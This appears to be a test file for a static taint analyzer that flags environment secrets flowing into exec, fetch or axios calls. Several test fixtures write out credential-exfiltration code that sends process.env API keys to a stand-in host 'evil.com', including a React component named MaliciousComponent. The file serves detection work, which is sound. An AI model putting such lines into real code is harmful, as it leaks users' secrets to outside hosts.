import { describe, expect, test } from "bun:test";
import { analyzeTaint } from "./analyzer.js";

describe("AST Intra-Procedural Taint Tracking", () => {
	test("Detects direct flows from env var to exec", () => {
		const code = `
      import { exec } from "child_process";
      exec(process.env.SECRET_KEY);
    `;
		const result = analyzeTaint([{ path: "test.js", content: code }]);
		expect(result.flows.length).toBe(1);
		expect(result.flows[0].severity).toBe("high"); // env -> exec is direct, which is TT1 -> high
	});

	test("Detects tainted variable flow from env var to exec", () => {
		const code = `
      import { exec } from "child_process";
      const mySecret = process.env.SECRET_KEY;
      const x = mySecret;
      exec(x);
    `;
		const result = analyzeTaint([{ path: "test.js", content: code }]);
		expect(result.flows.length).toBe(1);
		expect(result.flows[0].severity).toBe("medium"); // TT2
		expect(result.flows[0].description).toContain("Tainted flow");
	});

	test("Ignores false positive regex matches in strings/comments", () => {
		const code = `
      // We shouldn't use eval(process.env.SECRET) because it's dangerous
      const log = "process.env.TOKEN";
      console.log(log);
    `;
		const result = analyzeTaint([{ path: "test.js", content: code }]);
		expect(result.flows.length).toBe(0);
	});

	test("Detects credential to network output (TT3)", () => {
		const code = `
      const token = process.env.API_KEY;
      fetch("https://evil.com", { body: token });
    `;
		const result = analyzeTaint([{ path: "test.js", content: code }]);
		expect(result.flows.length).toBe(1);
		expect(result.flows[0].severity).toBe("critical"); // TT3 is critical
	});

	test("Parses .tsx files correctly and detects taint", () => {
		const code = `
      import React from "react";
      export function MaliciousComponent() {
        const token = process.env.SECRET_API_KEY;
        const sendToken = () => {
          fetch("https://evil.com/exfiltrate", { body: token });
        };
        return <div onClick={sendToken}>Click me</div>;
      }
    `;
		const result = analyzeTaint([{ path: "component.tsx", content: code }]);
		expect(result.flows.length).toBe(1);
		expect(result.flows[0].severity).toBe("critical"); // Tainted fetch flow (TT3 is critical for credentials to network)
		expect(result.flows[0].source.label).toContain("process.env");
		expect(result.flows[0].sink.label).toContain("fetch");
	});

	// ── member/alias regressions (previously dead-store false negatives) ──
	test("Detects a tainted OBJECT FIELD (o.x = secret; fetch(o.x))", () => {
		const code = `const s = process.env.API_KEY; const o = {}; o.x = s; fetch("http://evil.com", { method: "POST", body: o.x });`;
		expect(analyzeTaint([{ path: "f.js", content: code }]).flows.length).toBeGreaterThan(0);
	});
	test("Detects a tainted CLASS ATTRIBUTE (this.x)", () => {
		const code = `class C { constructor(){ this.x = process.env.API_KEY; } go(){ fetch("http://evil.com", { method:"POST", body: this.x }); } }`;
		expect(analyzeTaint([{ path: "c.js", content: code }]).flows.length).toBeGreaterThan(0);
	});
	test("Resolves a simple sink alias (const r = axios; r.post(secret))", () => {
		const code = `const r = axios; const k = process.env.API_KEY; r.post("http://evil.com", k);`;
		expect(analyzeTaint([{ path: "a.js", content: code }]).flows.length).toBeGreaterThan(0);
	});
	test("No false positive: a non-secret object field is not flagged", () => {
		const code = `const o = {}; o.x = "hello"; fetch("http://api.example.com", { method:"POST", body: o.x });`;
		expect(analyzeTaint([{ path: "b.js", content: code }]).flows.length).toBe(0);
	});
});
